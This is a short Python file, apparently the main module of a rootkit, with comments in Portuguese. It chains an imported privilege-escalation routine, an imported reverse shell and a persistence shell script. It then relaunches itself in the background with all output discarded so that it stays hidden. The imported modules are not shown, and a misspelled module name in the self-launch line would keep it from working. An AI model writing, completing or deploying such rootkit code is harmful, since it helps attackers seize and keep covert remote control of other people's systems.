#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import socket
import subprocess
import string
import time
import random as r
import sys
import subprocess

# Importando outros rookit 
sys.path.append('./src/')
# Privilege escalation
from privilege_scalation import elevar_privilegio

# Reverse shell
from reverse_shell import remote_shell

# Persistence
def persistence():
    output = subprocess.call(["./persistence.sh"])
#print (output)


# Função para verificar se o usuário é root
def check_root():
    return os.geteuid() == 0


# Função principal rootkit 
def rootkit_main(): 
    elevar_privilegio()
    remote_shell()
    persistence()

# Função para iniciar o rootkit em segundo plano
def rootkit_init():
    subprocess.Popen(["python", "-c", "from rookit import rootkit_main; rootkit_main()"],
                     stdout=open(os.devnull, 'w'),
                     stderr=open(os.devnull, 'w'),
                     close_fds=True)

if __name__ == "__main__":
    rootkit_init()
